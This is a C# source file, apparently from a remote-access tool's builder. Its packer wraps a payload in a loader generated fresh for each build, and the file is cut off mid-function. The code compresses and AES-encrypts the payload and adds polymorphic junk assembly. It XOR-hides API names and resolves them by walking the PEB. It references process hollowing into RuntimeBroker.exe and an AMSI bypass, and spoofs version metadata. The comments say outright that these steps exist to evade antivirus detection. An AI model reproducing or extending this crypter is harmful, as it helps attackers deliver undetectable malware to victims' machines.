using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace SeroServer.Builder;

/// <summary>
/// Custom packer: LZMS-compress + AES-256-CBC-encrypt the stub, then wrap it in a
/// randomised C loader (junk dead-code, AES decrypt via BCrypt, LZMS decompress,
/// in-memory PE map + CreateThread at entry point — no child process spawned).
/// Each build produces a unique binary: different junk symbols, random AES key/IV,
/// random PE timestamp, polymorphic x64 ASM junk functions.
/// </summary>
public static class CustomPackerBuilder
{
    // ── LZMS compression (Cabinet API — best ratio of all native Windows algorithms) ──

    [DllImport("cabinet.dll", SetLastError = true)]
    private static extern bool CreateCompressor(uint Algorithm, nint AllocationRoutines, out nint CompressorHandle);

    [DllImport("cabinet.dll", SetLastError = true)]
    private static extern bool Compress(nint CompressorHandle,
        byte[] UncompressedData, nint UncompressedDataSize,
        byte[] CompressedBuffer, nint CompressedBufferSize,
        out nint CompressedDataSize);

    [DllImport("cabinet.dll")]
    private static extern bool CloseCompressor(nint CompressorHandle);

    private const uint COMPRESS_ALGORITHM_LZMS = 5;

    private static byte[] Compress(byte[] data, Action<string> log)
    {
        if (!CreateCompressor(COMPRESS_ALGORITHM_LZMS, 0, out nint hComp))
            throw new InvalidOperationException($"CreateCompressor(LZMS) failed: {Marshal.GetLastWin32Error()}");
        var dst = new byte[data.Length * 2 + 65536];
        try
        {
            if (!Compress(hComp, data, (nint)data.Length, dst, (nint)dst.Length, out nint finalSize))
                throw new InvalidOperationException($"Compress(LZMS) failed: {Marshal.GetLastWin32Error()}");
            var result = new byte[(int)finalSize];
            Array.Copy(dst, result, (int)finalSize);
            log($"[*] CustomPacker: LZMS {data.Length / 1024:N0} KB → {result.Length / 1024:N0} KB ({100.0 * result.Length / data.Length:F0}%)");
            return result;
        }
        finally { CloseCompressor(hComp); }
    }

    // ── AES-256-CBC encryption ────────────────────────────────────────────────────

    private static (byte[] cipher, byte[] key, byte[] iv) EncryptAes(byte[] data)
    {
        var key = RandomNumberGenerator.GetBytes(32);
        var iv  = RandomNumberGenerator.GetBytes(16);
        using var aes = Aes.Create();
        aes.Key = key; aes.IV = iv;
        aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
        using var ms  = new MemoryStream();
        using var enc = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write);
        enc.Write(data); enc.FlushFinalBlock();
        return (ms.ToArray(), key, iv);
    }

    // ── Utilities ─────────────────────────────────────────────────────────────────

    private static string ToCArray(byte[] data, string name)
    {
        var sb = new StringBuilder();
        sb.Append($"static const unsigned char {name}[] = {{");
        for (int i = 0; i < data.Length; i++)
        {
            if (i % 16 == 0) sb.Append("\n    ");
            sb.Append($"0x{data[i]:X2}");
            if (i < data.Length - 1) sb.Append(',');
        }
        sb.Append($"\n}};\nstatic const unsigned int {name}_len = {data.Length}U;\n");
        return sb.ToString();
    }

    private static string Rnd(string prefix)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyz";
        var buf = RandomNumberGenerator.GetBytes(6);
        return prefix + new string(buf.Select(b => chars[b % chars.Length]).ToArray());
    }

    private static ulong Rnd64() =>
        BitConverter.ToUInt64(RandomNumberGenerator.GetBytes(8));

    private static byte RndRot() =>
        (byte)(RandomNumberGenerator.GetBytes(1)[0] % 61 + 1);  // 1..61

    private record XStr(string Decl, string Var, int Len, byte Key);
    private static XStr MakeXorStr(string s)
    {
        var nm = Rnd("_s");
        byte k = RandomNumberGenerator.GetBytes(1)[0];
        if (k == 0) k = 0x5B;
        var enc = Encoding.ASCII.GetBytes(s).Select(b => (byte)(b ^ k)).ToArray();
        var d = new StringBuilder($"static unsigned char {nm}[] = {{");
        foreach (var b in enc) d.Append($"0x{b:X2},");
        d.Append("0x00};");
        return new(d.ToString(), nm, enc.Length, k);
    }

    // ── MASM64 polymorphic ASM junk ───────────────────────────────────────────────

    private static (string asmSource, string fn1, string fn2, string fn3)
        GenerateAsmJunk()
    {
        string fn1 = Rnd("_za");
        string fn2 = Rnd("_zb");
        string fn3 = Rnd("_zc");
        // Labels inside functions need unique names per build
        string lbl1a = Rnd("_L");
        string lbl1b = Rnd("_L");
        string lbl2a = Rnd("_L");
        string lbl3a = Rnd("_L");
        string lbl3b = Rnd("_L");

        // 12 unique 64-bit constants — every build is completely different bytes
        ulong c0 = Rnd64(), c1 = Rnd64(), c2 = Rnd64(), c3 = Rnd64();
        ulong c4 = Rnd64(), c5 = Rnd64(), c6 = Rnd64(), c7 = Rnd64();
        ulong c8 = Rnd64(), c9 = Rnd64(), cA = Rnd64(), cB = Rnd64();
        byte r1 = RndRot(), r2 = RndRot(), r3 = RndRot();
        byte r4 = RndRot(), r5 = RndRot(), r6 = RndRot();
        // Small loop count 3-6 so emulation still terminates quickly
        byte lc = (byte)(RandomNumberGenerator.GetBytes(1)[0] % 4 + 3);

        var src = $$"""
; Polymorphic x64 dead-code — unique per build
PUBLIC {{fn1}}
PUBLIC {{fn2}}
PUBLIC {{fn3}}

.code

; fn1: integer chain + BSWAP + SHLD + opaque branch
{{fn1}} PROC
    push   rbx
    push   rdi
    push   rsi
    push   r14
    sub    rsp, 28h
    mov    rbx, 0{{c0:X16}}h
    mov    rdi, 0{{c1:X16}}h
    mov    rsi, 0{{c2:X16}}h
    mov    r14, 0{{c3:X16}}h
    bswap  rbx
    ror    rbx, {{r1}}
    shld   rdi, rsi, {{r2}}
    xor    rbx, rdi
    mov    rax, 0{{c4:X16}}h
    imul   rsi, rax
    add    r14, rsi
    ror    r14, {{r3}}
    bswap  r14
    ; opaque predicate: rbx AND NOT rbx is always zero — branch never taken
    mov    rax, rbx
    not    rax
    and    rax, rbx
    test   rax, rax
    jnz    {{lbl1a}}
    lea    rax, [rbx + rdi*2]
    xor    rax, r14
    ror    rax, {{r4}}
    jmp    {{lbl1b}}
{{lbl1a}}:
    ; dead path — never reached
    xor    rax, rax
{{lbl1b}}:
    add    rsp, 28h
    pop    r14
    pop    rsi
    pop    rdi
    pop    rbx
    ret
{{fn1}} ENDP

; fn2: SSE2 XMM + POPCNT + CMOVNZ + stack locals
{{fn2}} PROC
    push   rbp
    push   rbx
    push   r12
    push   r15
    sub    rsp, 60h
    mov    rbp, rsp
    mov    rbx, 0{{c5:X16}}h
    mov    r12, 0{{c6:X16}}h
    mov    r15, 0{{c7:X16}}h
    ; XMM operations (SSE2 — always available on x64)
    movq   xmm0, rbx
    movq   xmm1, r12
    pxor   xmm0, xmm1
    paddq  xmm0, xmm1
    movq   rbx,  xmm0
    ; POPCNT: count bits — result unpredictable to scanner
    popcnt rax, rbx
    mov    rdi, 0{{c8:X16}}h
    imul   rax, rdi
    xor    r15, rax
    ror    r15, {{r5}}
    ; write/read locals — looks like real data processing
    mov    QWORD PTR [rbp + 20h], rbx
    mov    QWORD PTR [rbp + 28h], r15
    mov    rax, QWORD PTR [rbp + 20h]
    add    rax, QWORD PTR [rbp + 28h]
    ; CMOVNZ: looks like error-path guard
    xor    r12, r12
    test   rax, rax
    cmovnz r12, r15
    mov    rax, 0{{c9:X16}}h
    add    r12, rax
    bswap  r12
    mov    rax, r12
    add    rsp, 60h
    pop    r15
    pop    r12
    pop    rbx
    pop    rbp
    ret
{{fn2}} ENDP

; fn3: counter loop + SHRD + bit-scatter + XCHG
{{fn3}} PROC
    push   rbx
    push   rcx
    push   rdx
    push   r8
    sub    rsp, 28h
    mov    rbx, 0{{cA:X16}}h
    mov    rdx, 0{{cB:X16}}h
    mov    r8,  0{{c0:X16}}h
    xor    rcx, rcx
    ; loop — counter makes opcode stream variable per iteration
{{lbl3a}}:
    ror    rbx, {{r6}}
    shrd   rdx, rbx, {{r1}}
    xor    r8,  rbx
    bswap  rbx
    xchg   rbx, rdx
    add    r8,  rbx
    inc    rcx
    cmp    rcx, {{lc}}
    jl     {{lbl3a}}
    ; opaque: x XOR x is always 0 — second branch unreachable
    mov    rax, r8
    xor    rax, r8
    test   rax, rax
    jnz    {{lbl3b}}
    lea    rax, [rbx + rdx]
    ror    rax, {{r3}}
    jmp    @F
{{lbl3b}}:
    xor    rax, rax
@@:
    add    rsp, 28h
    pop    r8
    pop    rdx
    pop    rcx
    pop    rbx
    ret
{{fn3}} ENDP

END

""";
        return (src, fn1, fn2, fn3);
    }

    // ── Resource file (icon + version info) ──────────────────────────────────────

    private static string GenerateResourceSource(string? iconPath, LoaderMetadata? meta, string exeName, string payloadBinPath)
    {
        var sb = new StringBuilder();
        sb.AppendLine("#include <windows.h>");
        // Payload blob as RCDATA — moves high-entropy .data to .rsrc, lower AV entropy weight
        sb.AppendLine($"101 RCDATA \"{EscRc(payloadBinPath)}\"");
        if (!string.IsNullOrEmpty(iconPath))
            sb.AppendLine($"1 ICON \"{EscRc(iconPath)}\"");
        if (meta != null)
        {
            var fv = ParseVersion(meta.FileVersion ?? "1.0.0.0");
            var pv = ParseVersion(meta.ProductVersion ?? meta.FileVersion ?? "1.0.0.0");
            sb.AppendLine($$"""
VS_VERSION_INFO VERSIONINFO
FILEVERSION {{fv}}
PRODUCTVERSION {{pv}}
FILEFLAGSMASK VS_FFI_FILEFLAGSMASK
FILEFLAGS 0x0L
FILEOS VOS__WINDOWS32
FILETYPE VFT_APP
FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "{{EscRc(meta.CompanyName)}}"
            VALUE "FileDescription",  "{{EscRc(meta.FileDescription)}}"
            VALUE "FileVersion",      "{{EscRc(meta.FileVersion)}}"
            VALUE "InternalName",     "{{EscRc(Path.GetFileNameWithoutExtension(exeName))}}"
            VALUE "LegalCopyright",   "{{EscRc(meta.Copyright)}}"
            VALUE "OriginalFilename", "{{EscRc(exeName)}}"
            VALUE "ProductName",      "{{EscRc(meta.ProductName)}}"
            VALUE "ProductVersion",   "{{EscRc(meta.ProductVersion)}}"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 0x04B0
    END
END
""");
        }
        return sb.ToString();
    }

    private static string ParseVersion(string? v)
    {
        var parts = (v ?? "1.0.0.0").Split('.').Take(4).Select(p =>
            int.TryParse(p, out int n) ? n : 0).ToArray();
        while (parts.Length < 4) parts = [.. parts, 0];
        return $"{parts[0]},{parts[1]},{parts[2]},{parts[3]}";
    }

    private static string EscRc(string? s) =>
        (s ?? "").Replace("\\", "\\\\").Replace("\"", "\\\"")
                 .Replace("\r", "").Replace("\n", "").Replace("\0", "");

    // ── C loader source ───────────────────────────────────────────────────────────

    private static string GenerateLoaderSource(
        byte[] cipher, byte[] key, byte[] iv,
        uint compressedLen, uint originalLen,
        string fnAsm1, string fnAsm2, string fnAsm3,
        string hollowTarget = "RuntimeBroker.exe")
    {
        string fnAes  = Rnd("_a");
        string fnDcmp = Rnd("_b");
        string fnHol  = Rnd("_c");
        string fnJunk = Rnd("_j");
        string fnRes  = Rnd("_r");
        string varX   = Rnd("x_");
        string varY   = Rnd("y_");
        uint jk1 = BitConverter.ToUInt32(RandomNumberGenerator.GetBytes(4));
        uint jk2 = BitConverter.ToUInt32(RandomNumberGenerator.GetBytes(4));
        uint jk3 = BitConverter.ToUInt32(RandomNumberGenerator.GetBytes(4));

        // XOR-encoded API name strings — kept in .data, not .rdata import table
        var sBcrypt = MakeXorStr("bcrypt.dll");
        var sCab    = MakeXorStr("cabinet.dll");
        var sBcOA   = MakeXorStr("BCryptOpenAlgorithmProvider");
        var sBcGP   = MakeXorStr("BCryptGetProperty");
        var sBcSP   = MakeXorStr("BCryptSetProperty");
        var sBcGK   = MakeXorStr("BCryptGenerateSymmetricKey");
        var sBcDc   = MakeXorStr("BCryptDecrypt");
        var sBcDK   = MakeXorStr("BCryptDestroyKey");
        var sBcCA   = MakeXorStr("BCryptCloseAlgorithmProvider");
        var sCrDc   = MakeXorStr("CreateDecompressor");
        var sDcmpS  = MakeXorStr("Decompress");
        var sClDc   = MakeXorStr("CloseDecompressor");
        var sHKey   = MakeXorStr("__SERO_H__");
        var sHVal   = MakeXorStr("1");
        var sHTgt   = MakeXorStr(hollowTarget);
        // kernel32 dynamic resolution strings
        var sK32    = MakeXorStr("kernel32.dll");
        var sLLA    = MakeXorStr("LoadLibraryA");
        var sGPA    = MakeXorStr("GetProcAddress");
        var sCPA    = MakeXorStr("CreateProcessA");
        var sVAEx   = MakeXorStr("VirtualAllocEx");
        var sVPEx   = MakeXorStr("VirtualProtectEx");
        var sWPM    = MakeXorStr("WriteProcessMemory");
        var sGTC    = MakeXorStr("GetThreadContext");
        var sSTC    = MakeXorStr("SetThreadContext");
        var sRTh    = MakeXorStr("ResumeThread");
        var sTPA    = MakeXorStr("TerminateProcess");
        var sCH     = MakeXorStr("CloseHandle");
        var sCRT    = MakeXorStr("CreateRemoteThread");
        var sWSO    = MakeXorStr("WaitForSingleObject");
        var sGSD    = MakeXorStr("GetSystemDirectoryA");
        var sSEV    = MakeXorStr("SetEnvironmentVariableA");
        var sVA     = MakeXorStr("VirtualAlloc");
        var sVF     = MakeXorStr("VirtualFree");
        var sGCPID  = MakeXorStr("GetCurrentProcessId");
        var sAmsiD  = MakeXorStr("amsi.dll");
        var sAmsiF  = MakeXorStr("AmsiScanBuffer");

        return $$"""
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <intrin.h>
#include <stdint.h>
#include <string.h>

/* BCrypt/Cabinet types — resolved dynamically, no IAT linking */
typedef LONG NTSTATUS;
typedef void* BCH;
typedef void* DCH;
#define _BCR_OK(s) ((NTSTATUS)(s)>=0)
#define _BC_PAD    0x00000001UL
#define _LZM_ALG   5UL
typedef NTSTATUS(WINAPI*_pBcOA)(BCH*,LPCWSTR,LPCWSTR,ULONG);
typedef NTSTATUS(WINAPI*_pBcGP)(BCH,LPCWSTR,PUCHAR,ULONG,ULONG*,ULONG);
typedef NTSTATUS(WINAPI*_pBcSP)(BCH,LPCWSTR,PUCHAR,ULONG,ULONG);
typedef NTSTATUS(WINAPI*_pBcGK)(BCH,BCH*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG);
typedef NTSTATUS(WINAPI*_pBcDc)(BCH,PUCHAR,ULONG,void*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG*,ULONG);
typedef NTSTATUS(WINAPI*_pBcDK)(BCH);
typedef NTSTATUS(WINAPI*_pBcCA)(BCH,ULONG);
typedef BOOL    (WINAPI*_pCrDc)(DWORD,void*,DCH*);
typedef BOOL    (WINAPI*_pDcmp)(DCH,void*,SIZE_T,void*,SIZE_T,SIZE_T*);
typedef BOOL    (WINAPI*_pClDc)(DCH);
/* kernel32 function pointer types */
typedef HMODULE (WINAPI*_pLLA )(LPCSTR);
typedef FARPROC (WINAPI*_pGPA )(HMODULE,LPCSTR);
typedef BOOL    (WINAPI*_pCPA )(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
typedef LPVOID  (WINAPI*_pVAEx)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL    (WINAPI*_pVPEx)(HANDLE,LPVOID,SIZE_T,DWORD,PDWORD);
typedef BOOL    (WINAPI*_pWPM )(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);
typedef BOOL    (WINAPI*_pGTC )(HANDLE,LPCONTEXT);
typedef BOOL    (WINAPI*_pSTC )(HANDLE,const CONTEXT*);
typedef DWORD   (WINAPI*_pRTh )(HANDLE);
typedef BOOL    (WINAPI*_pTPA )(HANDLE,UINT);
typedef BOOL    (WINAPI*_pCH  )(HANDLE);
typedef HANDLE  (WINAPI*_pCRT )(HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
typedef DWORD   (WINAPI*_pWSO )(HANDLE,DWORD);
typedef UINT    (WINAPI*_pGSD )(LPSTR,UINT);
typedef BOOL    (WINAPI*_pSEV )(LPCSTR,LPCSTR);
typedef LPVOID  (WINAPI*_pVA  )(LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL    (WINAPI*_pVF  )(LPVOID,SIZE_T,DWORD);
typedef DWORD   (WINAPI*_pGCPID)(void);
/* global function pointer table — filled by _res_apis() */
static _pLLA  g_LLA=NULL; static _pGPA  g_GPA=NULL;
static _pCPA  g_CPA=NULL; static _pVAEx g_VAEx=NULL;
static _pVPEx g_VPEx=NULL;static _pWPM  g_WPM=NULL;
static _pGTC  g_GTC=NULL; static _pSTC  g_STC=NULL;
static _pRTh  g_RTh=NULL; static _pTPA  g_TPA=NULL;
static _pCH   g_CH=NULL;  static _pCRT  g_CRT=NULL;
static _pWSO  g_WSO=NULL; static _pGSD  g_GSD=NULL;
static _pSEV  g_SEV=NULL; static _pVA   g_VA=NULL;
static _pVF   g_VF=NULL;  static _pGCPID g_GCPID=NULL;
/* XOR-encoded API strings */
{{sBcrypt.Decl}}
{{sCab.Decl}}
{{sBcOA.Decl}}
{{sBcGP.Decl}}
{{sBcSP.Decl}}
{{sBcGK.Decl}}
{{sBcDc.Decl}}
{{sBcDK.Decl}}
{{sBcCA.Decl}}
{{sCrDc.Decl}}
{{sDcmpS.Decl}}
{{sClDc.Decl}}
{{sHKey.Decl}}
{{sHVal.Decl}}
{{sHTgt.Decl}}
{{sK32.Decl}}
{{sLLA.Decl}}
{{sGPA.Decl}}
{{sCPA.Decl}}
{{sVAEx.Decl}}
{{sVPEx.Decl}}
{{sWPM.Decl}}
{{sGTC.Decl}}
{{sSTC.Decl}}
{{sRTh.Decl}}
{{sTPA.Decl}}
{{sCH.Decl}}
{{sCRT.Decl}}
{{sWSO.Decl}}
{{sGSD.Decl}}
{{sSEV.Decl}}
{{sVA.Decl}}
{{sVF.Decl}}
{{sGCPID.Decl}}
{{sAmsiD.Decl}}
{{sAmsiF.Decl}}
static void _xd(unsigned char* p,int n,unsigned char k){int i;for(i=0;i<n;i++)p[i]^=k;p[n]=0;}

/* PEB walk: find loaded module by lowercase ASCII name */
static HMODULE _find_mod(const char* nm,int nlen){
    ULONG_PTR peb=(ULONG_PTR)__readgsqword(0x60);
    BYTE* ldr=*(BYTE**)(peb+0x18);
    LIST_ENTRY* head=(LIST_ENTRY*)(ldr+0x20);
    LIST_ENTRY* cur=head->Flink;
    while(cur!=head){
        BYTE* ent=(BYTE*)cur-0x10;
        PVOID base=*(PVOID*)(ent+0x30);
        USHORT blen=*(USHORT*)(ent+0x58);
        WCHAR* bbuf=*(WCHAR**)(ent+0x60);
        if(base&&blen==(USHORT)(nlen*2)&&bbuf){
            int m=1;
            for(int i=0;i<nlen;i++){
                char ac=(char)(bbuf[i]&0xFF);
                if(ac>='A'&&ac<='Z') ac|=0x20;
                if(ac!=nm[i]){m=0;break;}
            }
            if(m) return (HMODULE)base;
        }
        cur=cur->Flink;
    }
    return NULL;
}

/* Manual GetProcAddress via PE export directory */
static FARPROC _manu_gpa(HMODULE hmod,const char* name){
    BYTE* base=(BYTE*)hmod;
    IMAGE_DOS_HEADER* dos=(IMAGE_DOS_HEADER*)base;
    if(dos->e_magic!=0x5A4D) return NULL;
    IMAGE_NT_HEADERS64* nt=(IMAGE_NT_HEADERS64*)(base+dos->e_lfanew);
    DWORD eRva=nt->OptionalHeader.DataDirectory[0].VirtualAddress;
    if(!eRva) return NULL;
    IMAGE_EXPORT_DIRECTORY* exp=(IMAGE_EXPORT_DIRECTORY*)(base+eRva);
    DWORD* names=(DWORD*)(base+exp->AddressOfNames);
    WORD*  ords =(WORD*) (base+exp->AddressOfNameOrdinals);
    DWORD* funcs=(DWORD*)(base+exp->AddressOfFunctions);
    for(DWORD i=0;i<exp->NumberOfNames;i++){
        const char* fn=(const char*)(base+names[i]);
        const char* a=fn,*b=name;
        while(*a&&*a==*b){a++;b++;}
        if(!*a&&!*b) return (FARPROC)(base+funcs[ords[i]]);
    }
    return NULL;
}

/* Resolve all kernel32 APIs via PEB walk — no IAT imports needed */
static void {{fnRes}}(void){
    unsigned char _nm[40];
    memcpy(_nm,{{sK32.Var}},{{sK32.Len}});_xd(_nm,{{sK32.Len}},0x{{sK32.Key:X2}});
    HMODULE hK=(HMODULE)_find_mod((char*)_nm,{{sK32.Len}});
    if(!hK) return;
    unsigned char _t[40];
    memcpy(_t,{{sLLA.Var}},{{sLLA.Len}});_xd(_t,{{sLLA.Len}},0x{{sLLA.Key:X2}});g_LLA=(_pLLA)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sGPA.Var}},{{sGPA.Len}});_xd(_t,{{sGPA.Len}},0x{{sGPA.Key:X2}});g_GPA=(_pGPA)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sCPA.Var}},{{sCPA.Len}});_xd(_t,{{sCPA.Len}},0x{{sCPA.Key:X2}});g_CPA=(_pCPA)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sVAEx.Var}},{{sVAEx.Len}});_xd(_t,{{sVAEx.Len}},0x{{sVAEx.Key:X2}});g_VAEx=(_pVAEx)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sVPEx.Var}},{{sVPEx.Len}});_xd(_t,{{sVPEx.Len}},0x{{sVPEx.Key:X2}});g_VPEx=(_pVPEx)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sWPM.Var}},{{sWPM.Len}});_xd(_t,{{sWPM.Len}},0x{{sWPM.Key:X2}});g_WPM=(_pWPM)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sGTC.Var}},{{sGTC.Len}});_xd(_t,{{sGTC.Len}},0x{{sGTC.Key:X2}});g_GTC=(_pGTC)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sSTC.Var}},{{sSTC.Len}});_xd(_t,{{sSTC.Len}},0x{{sSTC.Key:X2}});g_STC=(_pSTC)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sRTh.Var}},{{sRTh.Len}});_xd(_t,{{sRTh.Len}},0x{{sRTh.Key:X2}});g_RTh=(_pRTh)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sTPA.Var}},{{sTPA.Len}});_xd(_t,{{sTPA.Len}},0x{{sTPA.Key:X2}});g_TPA=(_pTPA)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sCH.Var}},{{sCH.Len}});_xd(_t,{{sCH.Len}},0x{{sCH.Key:X2}});g_CH=(_pCH)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sCRT.Var}},{{sCRT.Len}});_xd(_t,{{sCRT.Len}},0x{{sCRT.Key:X2}});g_CRT=(_pCRT)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sWSO.Var}},{{sWSO.Len}});_xd(_t,{{sWSO.Len}},0x{{sWSO.Key:X2}});g_WSO=(_pWSO)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sGSD.Var}},{{sGSD.Len}});_xd(_t,{{sGSD.Len}},0x{{sGSD.Key:X2}});g_GSD=(_pGSD)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sSEV.Var}},{{sSEV.Len}});_xd(_t,{{sSEV.Len}},0x{{sSEV.Key:X2}});g_SEV=(_pSEV)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sVA.Var}},{{sVA.Len}});_xd(_t,{{sVA.Len}},0x{{sVA.Key:X2}});g_VA=(_pVA)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sVF.Var}},{{sVF.Len}});_xd(_t,{{sVF.Len}},0x{{sVF.Key:X2}});g_VF=(_pVF)_manu_gpa(hK,(char*)_t);
    memcpy(_t,{{sGCPID.Var}},{{sGCPID.Len}});_xd(_t,{{sGCPID.Len}},0x{{sGCPID.Key:X2}});g_GCPID=(_pGCPID)_manu_gpa(hK,(char*)_t);
}

{{ToCArray(key, "g_key")}}
{{ToCArray(iv,  "g_iv")}}
static const unsigned int g_cmp_size = {{compressedLen}}U;
static const unsigned int g_org_size = {{originalLen}}U;

extern unsigned long long {{fnAsm1}}(void);
extern unsigned long long {{fnAsm2}}(void);
extern unsigned long long {{fnAsm3}}(void);

#pragma optimize("", off)
static __declspec(noinline) unsigned int {{fnJunk}}(unsigned int {{varX}}) {
    volatile unsigned int {{varY}} = {{varX}} ^ 0x{{jk1:X8}}U;
    for (int i = 0; i < 4; i++) {{varY}} = ({{varY}} >> 1) | ({{varY}} << 31);
    if ({{varY}} > 0x{{jk2:X8}}U) { {{varY}} ^= 0x{{jk3:X8}}U; {{varY}} += {{varX}}; }
    return {{varY}} ^ 0x{{jk2:X8}}U;
}
#pragma optimize("", on)

/* AES-256-CBC decrypt — dynamic BCrypt, LoadLibraryA/GetProcAddress via g_LLA/g_GPA */
static unsigned char* {{fnAes}}(const unsigned char* src, unsigned int src_len, unsigned int* out_len) {
    if(!g_LLA||!g_GPA||!g_VA||!g_VF) return NULL;
    unsigned char _db[14]; memcpy(_db,{{sBcrypt.Var}},{{sBcrypt.Len}}); _xd(_db,{{sBcrypt.Len}},0x{{sBcrypt.Key:X2}});
    HMODULE hB=(HMODULE)g_LLA((LPCSTR)_db); if (!hB) return NULL;
    unsigned char _n1[30]; memcpy(_n1,{{sBcOA.Var}},{{sBcOA.Len}}); _xd(_n1,{{sBcOA.Len}},0x{{sBcOA.Key:X2}});
    _pBcOA fOA=(_pBcOA)g_GPA(hB,(LPCSTR)_n1);
    unsigned char _n2[20]; memcpy(_n2,{{sBcGP.Var}},{{sBcGP.Len}}); _xd(_n2,{{sBcGP.Len}},0x{{sBcGP.Key:X2}});
    _pBcGP fGP=(_pBcGP)g_GPA(hB,(LPCSTR)_n2);
    unsigned char _n3[20]; memcpy(_n3,{{sBcSP.Var}},{{sBcSP.Len}}); _xd(_n3,{{sBcSP.Len}},0x{{sBcSP.Key:X2}});
    _pBcSP fSP=(_pBcSP)g_GPA(hB,(LPCSTR)_n3);
    unsigned char _n4[30]; memcpy(_n4,{{sBcGK.Var}},{{sBcGK.Len}}); _xd(_n4,{{sBcGK.Len}},0x{{sBcGK.Key:X2}});
    _pBcGK fGK=(_pBcGK)g_GPA(hB,(LPCSTR)_n4);
    unsigned char _n5[16]; memcpy(_n5,{{sBcDc.Var}},{{sBcDc.Len}}); _xd(_n5,{{sBcDc.Len}},0x{{sBcDc.Key:X2}});
    _pBcDc fDc=(_pBcDc)g_GPA(hB,(LPCSTR)_n5);
    unsigned char _n6[18]; memcpy(_n6,{{sBcDK.Var}},{{sBcDK.Len}}); _xd(_n6,{{sBcDK.Len}},0x{{sBcDK.Key:X2}});
    _pBcDK fDK=(_pBcDK)g_GPA(hB,(LPCSTR)_n6);
    unsigned char _n7[32]; memcpy(_n7,{{sBcCA.Var}},{{sBcCA.Len}}); _xd(_n7,{{sBcCA.Len}},0x{{sBcCA.Key:X2}});
    _pBcCA fCA=(_pBcCA)g_GPA(hB,(LPCSTR)_n7);
    if (!fOA||!fGP||!fSP||!fGK||!fDc||!fDK||!fCA) return NULL;
    BCH hAlg=NULL,hKey=NULL;
    unsigned char keyObj[1024]={0}; ULONG cbKeyObj=0,cbData=0;
    unsigned char* out=NULL;
    if (!_BCR_OK(fOA(&hAlg,L"AES",NULL,0))) goto done;
    fGP(hAlg,L"ObjectLength",(PUCHAR)&cbKeyObj,sizeof(ULONG),&cbData,0);
    fSP(hAlg,L"ChainingMode",(PUCHAR)L"ChainingModeCBC",sizeof(L"ChainingModeCBC"),0);
    if (!_BCR_OK(fGK(hAlg,&hKey,(cbKeyObj<=sizeof(keyObj))?keyObj:NULL,cbKeyObj,(PUCHAR)g_key,g_key_len,0))) goto done;
    unsigned char iv_copy[16]; memcpy(iv_copy,g_iv,16);
    ULONG plainLen=0;
    fDc(hKey,(PUCHAR)src,src_len,NULL,iv_copy,16,NULL,0,&plainLen,_BC_PAD);
    out=(unsigned char*)g_VA(NULL,plainLen,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if (!out) goto done;
    memcpy(iv_copy,g_iv,16);
    if (!_BCR_OK(fDc(hKey,(PUCHAR)src,src_len,NULL,iv_copy,16,out,plainLen,&cbData,_BC_PAD))) {
        g_VF(out,0,MEM_RELEASE); out=NULL;
    } else { *out_len=cbData; }
done:
    if (hKey) fDK(hKey);
    if (hAlg) fCA(hAlg,0);
    return out;
}

/* LZMS decompress — dynamic Cabinet, g_LLA/g_GPA, g_VA/g_VF */
static unsigned char* {{fnDcmp}}(const unsigned char* src, SIZE_T src_len, SIZE_T out_len) {
    if(!g_LLA||!g_GPA||!g_VA||!g_VF) return NULL;
    unsigned char _dc[14]; memcpy(_dc,{{sCab.Var}},{{sCab.Len}}); _xd(_dc,{{sCab.Len}},0x{{sCab.Key:X2}});
    HMODULE hC=(HMODULE)g_LLA((LPCSTR)_dc); if (!hC) return NULL;
    unsigned char _m1[20]; memcpy(_m1,{{sCrDc.Var}},{{sCrDc.Len}}); _xd(_m1,{{sCrDc.Len}},0x{{sCrDc.Key:X2}});
    _pCrDc fCrDc=(_pCrDc)g_GPA(hC,(LPCSTR)_m1);
    unsigned char _m2[12]; memcpy(_m2,{{sDcmpS.Var}},{{sDcmpS.Len}}); _xd(_m2,{{sDcmpS.Len}},0x{{sDcmpS.Key:X2}});
    _pDcmp fDcmp=(_pDcmp)g_GPA(hC,(LPCSTR)_m2);
    unsigned char _m3[18]; memcpy(_m3,{{sClDc.Var}},{{sClDc.Len}}); _xd(_m3,{{sClDc.Len}},0x{{sClDc.Key:X2}});
    _pClDc fClDc=(_pClDc)g_GPA(hC,(LPCSTR)_m3);
    if (!fCrDc||!fDcmp||!fClDc) return NULL;
    DCH hDec=NULL;
    if (!fCrDc(_LZM_ALG,NULL,&hDec)) return NULL;
